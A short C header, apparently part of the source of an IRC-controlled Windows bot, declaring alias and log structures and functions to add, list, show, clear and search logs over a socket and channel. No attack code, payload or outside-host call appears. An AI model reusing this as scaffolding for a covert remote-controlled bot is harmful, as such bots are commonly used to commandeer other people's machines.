/*
XXXXXXXXXXXXXX   XXXXX      XXXXX  XXXXXXXXXXXXX   XXXXXXXXXXXXX  
XXXXXXXXXXXXXXX  XXXXX      XXXXX  XXXXXXXXXXXXXX  XXXXXXXXXXXXXX 
XXXXXXXXXXXXXXX  XXXXX      XXXXX  XXXXXXXXXXXXX   XXXXXXXXXXXXX  
XXXX       XXXX  XXXXX      XXXXX  XXXXX           XXXXX            
XXXX       XXXX  XXXXX      XXXXX  XXXXX           XXXXX            
XXXXXXXXXXXXXXX  XXXXX      XXXXX  XXXXXXXXXXX     XXXXXXXXXXX     
XXXXXXXXXXXXXX   XXXXX      XXXXX  XXXXXXXXXXXX    XXXXXXXXXXXX     
XXXXXXXXX        XXXXX      XXXXX  XXXXXXXXXXX     XXXXXXXXXXX    
XXXX XXXXX       XXXXX      XXXXX  XXXXX           XXXXX           
XXXX  XXXXX      XXXXX      XXXXX  XXXXX           XXXXX           
XXXX   XXXXX     XXXXX      XXXXX  XXXXX           XXXXX           
XXXX    XXXXX    XXXXXX    XXXXXX  XXXXX           XXXXX           
XXXX     XXXXX   XXXXXXXXXXXXXXXX  XXXXX           XXXXX           
XXXX      XXXXX   XXXXXXXXXXXXXX   XXXXX           XXXXX           
XXXX       XXXXX   XXXXXXXXXXXX    XXXXX           XXXXX 
*/     


// alias structure
typedef struct ALIAS 
{
	 char name[24];
	 char command[160];

} ALIAS;

typedef struct SHOWLOG
{
	SOCKET sock;
	char chan[128];
	char filter[LOGLINE];
	int threadnum;
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;

} SHOWLOG;

int addalias(char *name, char *command);
void aliaslist(SOCKET sock, char *chan, BOOL notice);
void addlog(char *desc);
void addlogv(char *desc, ...);
void showlog(SOCKET sock, char *chan, BOOL notice, BOOL silent, char *filter);
void clearlog(SOCKET sock, char *chan, BOOL notice, BOOL silent);
BOOL searchlog(char *filter);
DWORD WINAPI ShowLogThread(LPVOID param);
#ifdef DEBUG_LOGGING
void opendebuglog(void);
void debuglog(char *buffer,BOOL crlf=TRUE);
void closedebuglog(void);
#endif
#ifdef DEBUG_CONSOLE
BOOL WINAPI HandlerRoutine(DWORD dwCtrlType);
void OpenConsole(void);
#endif